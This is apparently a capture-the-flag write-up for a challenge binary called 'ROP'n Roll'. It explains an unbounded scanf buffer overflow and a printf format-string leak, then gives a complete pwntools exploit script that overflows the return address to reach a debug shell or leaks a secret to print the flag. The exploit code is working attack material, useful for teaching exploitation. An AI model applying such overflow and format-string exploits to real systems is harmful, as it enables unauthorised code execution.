# ROP'n Roll

### Summary

There are two exploitable bugs in the binary which we can leverage to get our flag. In the `start_game()` function we can see that **scanf()** is used without specifying the amount of data to read in Ex: **scanf("%s", buff)** instead of **scanf("%25s", buff)**. This can result in a *buffer-overflow vulnerability*, 
we can also see the same bug in the function `Guess_secret()` but to get to that code path we first have to correctly guess the secret value. If we look at how the program handles our guesses (input) we see that the **printf()** function is being used incorrectly *Ex:* **printf(buff)** this can lead to a *format-string vulnerability*
Now that we know the bugs present in the binary we can use one of the two exploitation strategies

**Get Shell**
- Reverse the Key generation algorithm and retrieve our key
- exploit the scanf bug in the `start_game()` function to overflow EIP
- Let EIP point to our `Enter_Debug()` function with the key as an argument

**Print Flag**
- Leak the secret value by supplying **%s** as input when asked for the secret
- exploit the **scanf()** bug to overflow into the variable
- make the variable hold the value `0xCAFEBABE`


```python

#!/usr/bin/env python3

import argparse
import yaml
import logging
from pwn import *
from pathlib import Path



logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]

class Exploit:
    FLAG = 1   # used as a constant for determining exploit type
    SHELL = 2  # used as a constant for determining exploit type

    def __init__(self, sh = None, binary = None):
        self.sh = sh
        self.binary = binary

    def Get_shell(self, key: int):
        padding = 62
        ROP_Chain = [
                b"\x90"*padding,
                p32(self.binary.sym.Enter_Debug),
                b"\x90"*4,
                p32(key)
                ]
        self.sh.sendlineafter("#>", b''.join(ROP_Chain))
        self.sh.interactive()

    def Leak_secret(self):
        self.sh.sendlineafter(b"#>", b"3")
        self.sh.sendlineafter(b": ", b"%s")
        self.sh.recvuntil(b": ")
        secret = self.sh.recvline().decode().strip()
        return secret

    def Get_flag_fstring(self):
        secret = self.Leak_secret()
        self.sh.sendlineafter(b":", secret)
        self.sh.sendlineafter(b": ", b"A"*20 + p32(0xCAFEBABE))
        self.sh.interactive()

    def Gen_Key(self):
        key = None
        for _ in range(0xfff):
            sum_ = ((2*(0xBEEF) ^ 0x16) * _) >> 0x10
            if sum_ == 1337:
                key = _
        return key




def solve(sh, method=None):
    binary = context.binary = ELF("./chal", checksec=False)
    exploit = Exploit(sh, binary)

    if method == Exploit.SHELL:
        exploit.Get_shell(exploit.Gen_Key())
    elif method == Exploit.FLAG:
        exploit.Get_flag_fstring()


def test(domain, port, method=None):
    sh = remote(domain, port)
    solve(sh, method)



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()
    parser.add_argument("domain", default="0.0.0.0", nargs="?")
    parser.add_argument("port", default=1337, type=int, nargs="?")
    parser.add_argument("--flag", action="store_true", help="Exploit using format string method")
    parser.add_argument("--shell", action="store_true", help="Exploit using Ret2win")
    args_argparse = parser.parse_args()

    if args.REMOTE:
        if args_argparse.flag:
            test(args_argparse.domain, args_argparse.port, Exploit.FLAG)
        elif args_argparse.shell:
            test(args_argparse.domain, args_argparse.port, Exploit.SHELL)
    else:
        sh = process("./chal")
        if args_argparse.flag:
            solve(sh, Exploit.FLAG)
        elif args_argparse.shell:
            solve(sh, Exploit.SHELL)
        else:
            log.warning("Missing an Exploit Method")
            log.warning("Available Methods: --flag,--shell")

```
